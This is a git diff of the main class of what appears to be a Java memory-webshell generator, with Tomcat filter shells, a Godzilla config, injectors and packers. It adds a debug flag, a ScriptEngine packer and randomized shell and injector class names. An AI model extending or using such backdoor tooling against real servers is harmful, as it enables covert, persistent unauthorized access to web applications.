@@ -3,14 +3,14 @@ package com.reajason.javaweb;
 import com.reajason.javaweb.config.*;
 import com.reajason.javaweb.memsell.AbstractShell;
 import com.reajason.javaweb.memsell.packer.Packer;
+import com.reajason.javaweb.memsell.tomcat.TomcatShell;
+import com.reajason.javaweb.util.CommonUtil;
 import lombok.SneakyThrows;
 import net.bytebuddy.jar.asm.Opcodes;
 import org.apache.commons.codec.binary.Base64;
+import org.apache.commons.lang3.StringUtils;
 
 import java.io.IOException;
-import java.nio.file.Files;
-import java.nio.file.Paths;
-import java.nio.file.StandardOpenOption;
 
 /**
  * @author ReaJason
@@ -24,6 +24,7 @@ public class GeneratorMain {
                 .shellTool(ShellTool.Command)
                 .shellType(Constants.FILTER)
                 .targetJreVersion(Opcodes.V1_6)
+                .debug(true)
                 .build();
         GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                 .pass("pass")
@@ -37,7 +38,7 @@ public class GeneratorMain {
 //            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
 //            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
             System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
-            System.out.println(new String(Packer.INSTANCE.JSP.getPacker().pack(generateResult)));
+            System.out.println(Packer.INSTANCE.ScriptEngine.getPacker().pack(generateResult));
         }
     }
 
@@ -47,11 +48,19 @@ public class GeneratorMain {
         if (shell == null) {
             throw new IllegalArgumentException("Unsupported server");
         }
+        if (StringUtils.isBlank(shellToolConfig.getShellClassName())) {
+            shellToolConfig.setShellClassName(CommonUtil.generateShellClassName(server, shellConfig.getShellType()));
+        }
+
+        if (StringUtils.isBlank(injectorConfig.getInjectorClassName())) {
+            injectorConfig.setInjectorClassName(CommonUtil.generateInjectorClassName());
+        }
+
         return shell.generate(shellConfig, injectorConfig, shellToolConfig);
     }
 
     @SneakyThrows
-    public static byte[] generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig, Packer.INSTANCE packerInstance) {
+    public static String generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig, Packer.INSTANCE packerInstance) {
         GenerateResult generateResult = generate(shellConfig, injectorConfig, shellToolConfig);
         if (generateResult != null) {
             return packerInstance.getPacker().pack(generateResult);
